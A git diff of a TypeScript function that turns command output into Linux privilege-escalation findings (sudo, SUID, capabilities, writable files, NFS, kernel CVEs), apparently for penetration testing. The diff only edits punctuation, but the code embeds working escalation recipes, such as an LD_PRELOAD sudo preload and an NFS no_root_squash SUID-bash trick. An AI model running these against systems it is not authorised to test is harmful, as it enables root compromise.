@@ -321,39 +321,39 @@ export function analyzePrivesc(report: WatcherReport): PrivescResult {
   for (const [bin, seq] of s.sudoBins) {
     const tech = GTFOBINS_SUDO[bin];
     add({ id: `sudo:${bin}`, vector: "sudo", severity: tech ? "confirmed" : "likely", title: `sudo ${bin}`,
-      detail: `You may run \`${bin}\` as root via sudo${tech ? "" : " (not in the rulebook — check GTFOBins)"}.`,
+      detail: `You may run \`${bin}\` as root via sudo${tech ? "" : " (not in the rulebook: check GTFOBins)"}.`,
       abuse: tech ?? `sudo ${bin}   # look for a shell/file-write escape on GTFOBins`, ref: gtfoRef(bin, "sudo"), evidence_seq: seq });
   }
 
   for (const [bin, seq] of s.suid) {
     const tech = GTFOBINS_SUID[bin];
     if (tech) add({ id: `suid:${bin}`, vector: "suid", severity: "confirmed", title: `SUID ${bin}`, detail: `\`${bin}\` has the SUID bit, so it runs as its owner (root) whoever launches it.`, abuse: tech, ref: gtfoRef(bin, "suid"), evidence_seq: seq });
-    else add({ id: `suid:${bin}`, vector: "suid", severity: "info", title: `SUID ${bin}`, detail: `\`${bin}\` is SUID-root but has no known GTFOBins escape — investigate manually.`, abuse: `${bin}   # no known GTFOBins SUID escape`, ref: gtfoRef(bin, "suid"), evidence_seq: seq });
+    else add({ id: `suid:${bin}`, vector: "suid", severity: "info", title: `SUID ${bin}`, detail: `\`${bin}\` is SUID-root but has no known GTFOBins escape. Investigate manually.`, abuse: `${bin}   # no known GTFOBins SUID escape`, ref: gtfoRef(bin, "suid"), evidence_seq: seq });
   }
 
-  for (const [bin, seq] of s.sgid) { const tech = GTFOBINS_SGID[bin]; if (tech) add({ id: `sgid:${bin}`, vector: "sgid", severity: "confirmed", title: `SGID ${bin}`, detail: `\`${bin}\` has the SGID bit — it runs with its owning group's privileges.`, abuse: tech, ref: gtfoRef(bin, ""), evidence_seq: seq }); }
+  for (const [bin, seq] of s.sgid) { const tech = GTFOBINS_SGID[bin]; if (tech) add({ id: `sgid:${bin}`, vector: "sgid", severity: "confirmed", title: `SGID ${bin}`, detail: `\`${bin}\` has the SGID bit: it runs with its owning group's privileges.`, abuse: tech, ref: gtfoRef(bin, ""), evidence_seq: seq }); }
 
   for (const { bin, cap, seq } of s.caps) {
     const core = cap.split(/[+,=]/)[0];
     const tech = GTFOBINS_CAPS[`${bin}|${core}`] ?? GTFOBINS_CAPS[`*|${core}`];
     add({ id: `cap:${bin}:${core}`, vector: "cap", severity: tech ? "confirmed" : "likely", title: `cap ${bin} ${core}`,
-      detail: `\`${bin}\` carries the ${core} capability — a targeted root-ish power baked into the binary.`,
+      detail: `\`${bin}\` carries the ${core} capability, a targeted root-ish power baked into the binary.`,
       abuse: tech ?? `${bin} has ${core} — check the GTFOBins capabilities page.`, ref: gtfoRef(bin, "capabilities"), evidence_seq: seq });
   }
 
   for (const g of s.groups) { const d = DANGEROUS_GROUPS[g]; if (d) add({ id: `group:${g}`, vector: "group", severity: d.direct ? "confirmed" : "likely", title: `group ${g}`, detail: `Your user is in the \`${g}\` group${d.direct ? ", which grants root-equivalent power on this box" : ""}.`, abuse: d.tech, evidence_seq: report.episodes.find((e) => /\b(id|groups)\b/.test(e.cmd))?.seq ?? 0 }); }
 
   for (const [path, seq] of s.writable) {
-    if (SENSITIVE_WRITABLE[path]) { add({ id: `writable:${path}`, vector: "writable", severity: "confirmed", title: `writable ${path}`, detail: `${path} is writable by your user — a sensitive system file you shouldn't be able to touch.`, abuse: SENSITIVE_WRITABLE[path], evidence_seq: seq }); continue; }
+    if (SENSITIVE_WRITABLE[path]) { add({ id: `writable:${path}`, vector: "writable", severity: "confirmed", title: `writable ${path}`, detail: `${path} is writable by your user, a sensitive system file you shouldn't be able to touch.`, abuse: SENSITIVE_WRITABLE[path], evidence_seq: seq }); continue; }
     const dir = Object.keys(SENSITIVE_WRITABLE_DIRS).find((d) => path === d || path.startsWith(d));
     if (dir) add({ id: `writable:${path}`, vector: dir.includes("systemd") ? "systemd" : "writable", severity: "confirmed", title: dir.includes("systemd") ? "writable systemd dir" : `writable ${path}`, detail: `${path} is a writable directory that feeds a root-run mechanism.`, abuse: SENSITIVE_WRITABLE_DIRS[dir], ref: dir.includes("systemd") ? "https://gtfobins.github.io/" : undefined, evidence_seq: seq });
   }
 
-  if (s.ldPreload) add({ id: "ld-preload", vector: "ld-preload", severity: "confirmed", title: "sudo keeps LD_PRELOAD", detail: "sudo keeps LD_PRELOAD/LD_LIBRARY_PATH (env_keep) — preload a malicious library into any sudo-allowed command.", abuse: "gcc -fPIC -shared -o /tmp/x.so evil.c && sudo LD_PRELOAD=/tmp/x.so <any-allowed-command>", evidence_seq: report.episodes.find((e) => /sudo\s+-l/.test(e.cmd))?.seq ?? 0 });
+  if (s.ldPreload) add({ id: "ld-preload", vector: "ld-preload", severity: "confirmed", title: "sudo keeps LD_PRELOAD", detail: "sudo keeps LD_PRELOAD/LD_LIBRARY_PATH (env_keep): preload a malicious library into any sudo-allowed command.", abuse: "gcc -fPIC -shared -o /tmp/x.so evil.c && sudo LD_PRELOAD=/tmp/x.so <any-allowed-command>", evidence_seq: report.episodes.find((e) => /sudo\s+-l/.test(e.cmd))?.seq ?? 0 });
 
-  for (const [share, seq] of s.nfs) add({ id: `nfs:${share}`, vector: "nfs", severity: "confirmed", title: `NFS ${share} no_root_squash`, detail: `${share} is NFS-exported with no_root_squash — a SUID root binary you create on an attacker box stays root here.`, abuse: `# on attacker (root): mount -o rw <ip>:${share} /mnt/x; cp /bin/bash /mnt/x/sh; chmod +s /mnt/x/sh\n# on target: ${share}/sh -p`, evidence_seq: seq });
+  for (const [share, seq] of s.nfs) add({ id: `nfs:${share}`, vector: "nfs", severity: "confirmed", title: `NFS ${share} no_root_squash`, detail: `${share} is NFS-exported with no_root_squash, so a SUID root binary you create on an attacker box stays root here.`, abuse: `# on attacker (root): mount -o rw <ip>:${share} /mnt/x; cp /bin/bash /mnt/x/sh; chmod +s /mnt/x/sh\n# on target: ${share}/sh -p`, evidence_seq: seq });
 
-  if (s.kernel) for (const k of KERNEL_CVES) { const v = parseVer(s.kernel); if (v && inRange(v, k.lo, k.hi)) add({ id: `kcve:${k.cve}`, vector: "kernel-cve", severity: "likely", title: `${k.name} (${k.cve})`, detail: `Kernel ${s.kernel} falls in the affected range — but version alone isn't proof; distros backport fixes.`, abuse: `${k.note}\n# verify: searchsploit ${k.cve} / run linux-exploit-suggester`, ref: `https://nvd.nist.gov/vuln/detail/${k.cve}`, evidence_seq: 0 }); }
+  if (s.kernel) for (const k of KERNEL_CVES) { const v = parseVer(s.kernel); if (v && inRange(v, k.lo, k.hi)) add({ id: `kcve:${k.cve}`, vector: "kernel-cve", severity: "likely", title: `${k.name} (${k.cve})`, detail: `Kernel ${s.kernel} falls in the affected range. Version alone isn't proof; distros backport fixes.`, abuse: `${k.note}\n# verify: searchsploit ${k.cve} / run linux-exploit-suggester`, ref: `https://nvd.nist.gov/vuln/detail/${k.cve}`, evidence_seq: 0 }); }
   if (s.sudoVersion) for (const c of SUDO_CVES) { const v = parseVer(s.sudoVersion); if (v && c.ranges.some(([lo, hi]) => inRange(v, lo, hi))) add({ id: `scve:${c.cve}`, vector: "sudo-cve", severity: "likely", title: `${c.name} (${c.cve})`, detail: `sudo ${s.sudoVersion} falls in the affected range for ${c.cve}. Confirm before firing.`, abuse: `${c.note}\n# verify: searchsploit ${c.cve}`, ref: `https://nvd.nist.gov/vuln/detail/${c.cve}`, evidence_seq: 0 }); }
 
   const order: Record<PrivescSeverity, number> = { confirmed: 0, likely: 1, info: 2 };
